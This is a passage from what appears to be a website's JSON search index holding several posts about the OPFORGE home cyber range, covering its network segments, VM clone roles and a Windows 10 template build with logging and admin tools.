\u003ccode\u003eopf-red01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eWinlogbeat and Sysmon on endpoints\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-3-professionalization\"\u003ePhase 3: Professionalization\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCloned base templates (\u003ccode\u003ebase-ubuntu-2204-template\u003c/code\u003e, \u003ccode\u003ebase-windows10-template\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eVM-specific roles: \u003ccode\u003eopf-ai01\u003c/code\u003e, \u003ccode\u003eopf-log01\u003c/code\u003e, \u003ccode\u003eopf-mbr01\u003c/code\u003e, etc.\u003c/li\u003e\n\u003cli\u003eAI and ML integration via Jupyter (\u003ccode\u003eopf-ai01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eMulti-tiered ingest pipeline (Zeek → Logstash → OpenSearch)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"lessons-learned\"\u003eLessons Learned\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLegacy OS images break modern tools\u003c/li\u003e\n\u003cli\u003eCloning base templates improves consistency\u003c/li\u003e\n\u003cli\u003eNetwork segmentation is essential for realistic detection engineering\u003c/li\u003e\n\u003c/ul\u003e","title":"OPFORGE Infrastructure Overview"},{"content":"OPFORGE Network Layout Segments CSOCINFRA (192.168.20.0/24): Houses opf-log01 (SIEM) and opf-ai01 (ML detection) LANWORKSTATIONS (192.168.30.0/24): Contains opf-mbr01 and future endpoints DMZRED (192.168.22.0/24): Hosts attacker targets like opf-cloud01 ADINFRA (192.168.40.0/24): Supports opf-dc01 and GPO testing Example Host Assignments Host IP Address Segment opf-fw01 192.168.1.24 (WAN) pfSense router opf-dc01 192.168.40.100 ADINFRA opf-mbr01 192.168.30.101 LANWORKSTATIONS opf-red01 192.168.22.50 DMZRED opf-log01 192.168.20.12 CSOCINFRA ","permalink":"https://opforge.dev/docs/opf-network-layout/","summary":"\u003ch1 id=\"opforge-network-layout\"\u003eOPFORGE Network Layout\u003c/h1\u003e\n\u003ch2 id=\"segments\"\u003eSegments\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCSOCINFRA (192.168.20.0/24)\u003c/strong\u003e: Houses \u003ccode\u003eopf-log01\u003c/code\u003e (SIEM) and \u003ccode\u003eopf-ai01\u003c/code\u003e (ML detection)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLANWORKSTATIONS (192.168.30.0/24)\u003c/strong\u003e: Contains \u003ccode\u003eopf-mbr01\u003c/code\u003e and future endpoints\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDMZRED (192.168.22.0/24)\u003c/strong\u003e: Hosts attacker targets like \u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eADINFRA (192.168.40.0/24)\u003c/strong\u003e: Supports \u003ccode\u003eopf-dc01\u003c/code\u003e and GPO testing\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"example-host-assignments\"\u003eExample Host Assignments\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eHost\u003c/th\u003e\n          \u003cth\u003eIP Address\u003c/th\u003e\n          \u003cth\u003eSegment\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-fw01\u003c/td\u003e\n          \u003ctd\u003e192.168.1.24 (WAN)\u003c/td\u003e\n          \u003ctd\u003epfSense router\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-dc01\u003c/td\u003e\n          \u003ctd\u003e192.168.40.100\u003c/td\u003e\n          \u003ctd\u003eADINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-mbr01\u003c/td\u003e\n          \u003ctd\u003e192.168.30.101\u003c/td\u003e\n          \u003ctd\u003eLANWORKSTATIONS\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-red01\u003c/td\u003e\n          \u003ctd\u003e192.168.22.50\u003c/td\u003e\n          \u003ctd\u003eDMZRED\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-log01\u003c/td\u003e\n          \u003ctd\u003e192.168.20.12\u003c/td\u003e\n          \u003ctd\u003eCSOCINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","title":"OPFORGE Network Layout"},{"content":"🔁 Cloned VMs in the OPFORGE Lab The following VMs are derived from the base templates and customized for their operational roles.\nTemplate Clone Role Description base-ubuntu-2204-template opf-red01 Red Team operator + C2 lab base-ubuntu-2204-template opf-log01 Log ingestion + OpenSearch stack base-ubuntu-2204-template opf-ai01 ML/AI detection modeling base-ubuntu-2204-template opf-cloud01 Web app target in DMZRED base-windows10-template opf-mbr01 Domain-joined endpoint (Win10) 🧠 Notes Hostnames and static IPs are applied per segment Each VM is configured with dedicated virtual NICs Cloning process preserves snapshot state and configuration integrity ","permalink":"https://opforge.dev/posts/opf-clone-map/","summary":"\u003ch2 id=\"-cloned-vms-in-the-opforge-lab\"\u003e🔁 Cloned VMs in the OPFORGE Lab\u003c/h2\u003e\n\u003cp\u003eThe following VMs are derived from the base templates and customized for their operational roles.\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eTemplate\u003c/th\u003e\n          \u003cth\u003eClone\u003c/th\u003e\n          \u003cth\u003eRole Description\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-red01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eRed Team operator + C2 lab\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-log01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eLog ingestion + OpenSearch stack\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-ai01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eML/AI detection modeling\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eWeb app target in DMZRED\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-windows10-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-mbr01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eDomain-joined endpoint (Win10)\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"-notes\"\u003e🧠 Notes\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eHostnames and static IPs are applied per segment\u003c/li\u003e\n\u003cli\u003eEach VM is configured with dedicated virtual NICs\u003c/li\u003e\n\u003cli\u003eCloning process preserves snapshot state and configuration integrity\u003c/li\u003e\n\u003c/ul\u003e","title":"OPFORGE VM Clone Map"},{"content":"Clone Map Template Clone Name Purpose base-ubuntu-2204-template opf-red01 Red Team operator box base-ubuntu-2204-template opf-log01 Log pipeline (Zeek, OpenSearch) base-ubuntu-2204-template opf-ai01 Jupyter + anomaly detection base-ubuntu-2204-template opf-cloud01 Targeted web app for attack base-windows10-template opf-mbr01 Domain-joined endpoint Lessons Learned Clone from snapshot, then personalize (hostname, NIC, IP) Use base templates with all dependencies pre-installed Maintain consistency across VM builds using scripting and snapshots ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-vm-cloning/","summary":"\u003ch2 id=\"clone-map\"\u003eClone Map\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eTemplate\u003c/th\u003e\n          \u003cth\u003eClone Name\u003c/th\u003e\n          \u003cth\u003ePurpose\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-red01\u003c/td\u003e\n          \u003ctd\u003eRed Team operator box\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-log01\u003c/td\u003e\n          \u003ctd\u003eLog pipeline (Zeek, OpenSearch)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-ai01\u003c/td\u003e\n          \u003ctd\u003eJupyter + anomaly detection\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-cloud01\u003c/td\u003e\n          \u003ctd\u003eTargeted web app for attack\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-windows10-template\u003c/td\u003e\n          \u003ctd\u003eopf-mbr01\u003c/td\u003e\n          \u003ctd\u003eDomain-joined endpoint\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"lessons-learned\"\u003eLessons Learned\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eClone from snapshot, then personalize (hostname, NIC, IP)\u003c/li\u003e\n\u003cli\u003eUse base templates with all dependencies pre-installed\u003c/li\u003e\n\u003cli\u003eMaintain consistency across VM builds using scripting and snapshots\u003c/li\u003e\n\u003c/ul\u003e","title":"Scaling OPFORGE: How I Clone and Manage Cyber Range VMs"},{"content":"This post documents the process of building and finalizing the Windows 10 Pro 22H2 template for use in the OPFORGE cyber lab environment.\n🛠️ Version \u0026amp; Baseline OS: Windows 10 Pro 22H2 (fully patched as of 2025-05-25) Build Source: Clean ISO install (22H2), upgraded from legacy 10240 Purpose: Golden template for domain-joined endpoint clones (opf-mbr01, future victim hosts) 📦 Tool Installation via Script After installation and patching, the following tools were installed using the custom script:\nInstall-OPFORGE-WindowsTools.ps1 Tools Installed: Sysmon Winlogbeat 7zip VSCode Notepad++ Sysinternals Suite Wireshark Autoruns Process Explorer 🔐 System Hardening Included in the setup:\nRemoval of bloatware and telemetry Disabling Cortana, Xbox services, OneDrive Clean Start Menu layout Chocolatey configured for repeat installs 🧽 Final Cleanup \u0026amp; Snapshot Prior to cloning or Sysprep:\ncleanmgr /sagerun:1 powercfg -h off Snapshot taken:\nbase-windows10-template - win10_22H2_tools_installed\n✅ Status This image is ready to be cloned into production boxes like:\nopf-mbr01 Future detection test targets Domain-joined Windows clients For installation automation, refer to: Install-OPFORGE-WindowsTools.ps1\n","permalink":"https://opforge.dev/posts/windows-setup/","summary":"\u003cp\u003eThis post documents the process of building and finalizing the \u003cstrong\u003eWindows 10 Pro 22H2\u003c/strong\u003e template for use in the OPFORGE cyber lab environment.\u003c/p\u003e\n\u003ch2 id=\"-version--baseline\"\u003e🛠️ Version \u0026amp; Baseline\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Windows 10 Pro 22H2 (fully patched as of 2025-05-25)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBuild Source\u003c/strong\u003e: Clean ISO install (22H2), upgraded from legacy 10240\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePurpose\u003c/strong\u003e: Golden template for domain-joined endpoint clones (\u003ccode\u003eopf-mbr01\u003c/code\u003e, future victim hosts)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"-tool-installation-via-script\"\u003e📦 Tool Installation via Script\u003c/h2\u003e\n\u003cp\u003eAfter installation and patching, the following tools were installed using the custom script:\u003c/p\u003e","title":"Windows 10 Template Setup for OPFORGE"}]